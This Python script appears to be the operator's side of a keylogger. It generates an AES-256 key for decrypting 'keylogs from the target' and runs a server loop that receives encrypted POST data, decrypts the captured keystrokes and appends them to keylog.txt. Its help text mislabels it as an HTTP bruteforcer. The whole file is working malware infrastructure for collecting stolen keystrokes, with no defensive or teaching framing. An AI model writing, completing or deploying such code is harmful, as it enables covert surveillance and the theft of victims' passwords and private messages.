import os.path
import sys
import argparse
from decryption import *
from collection import *
from key_generation import *

def main():

    parser = argparse.ArgumentParser(description='http bruteforcer capable of breaking basic (get) and form (post) authentication')
    
    parser.add_argument('-m','--mode', dest='_execution_mode', type=str, help='execution mode')

    args = parser.parse_args()
    
    execution_mode = args._execution_mode

    if(execution_mode is None):

        print(f'\n[-] You must enter an execution mode!\n')
        exit()
    
    elif(execution_mode == "keygen"):

        print("\n[+] Your new AES-256 key is: " + get_aes_256_key() + "\n")
        print("[!] Please save this key as it will be required to decrypt the keylogs from the target!\n")

    elif(execution_mode == "server"):

        hex_key = input("\nPlease enter your 256-bit AES key: ")

        print("\n[+] HTTP Server has started!\n")
        print("[!] Ready to recieve log files...\n")
        print("[!] Please do not close this script or lose internet connection!\n")

        while(True):

            clean_request_data = ""

            for char in get_raw_post_data():
                if(ord(char) != 0):
                    clean_request_data += char

            seperated_request_data = clean_request_data.split('data=')

            encrypted_data = seperated_request_data[1]

            hex_iv = encrypted_data[len(encrypted_data)-32:len(encrypted_data)]
            encrypted_log = encrypted_data[0:len(encrypted_data)-32]

            decrypted_log = str(decrypt_data(encrypted_log, hex_key, hex_iv))
        
            decrypted_log = decrypted_log.replace("b'","")
            decrypted_log = decrypted_log.replace("'","")

            keylog_file = open('keylog.txt', 'a')
             
            keylog_file.write(decrypted_log)
        
            keylog_file.write('\n')
            keylog_file.write('\n')

            print("[+] Keylog recieved, data written to keylog.txt!\n")

if __name__ == "__main__":
    main()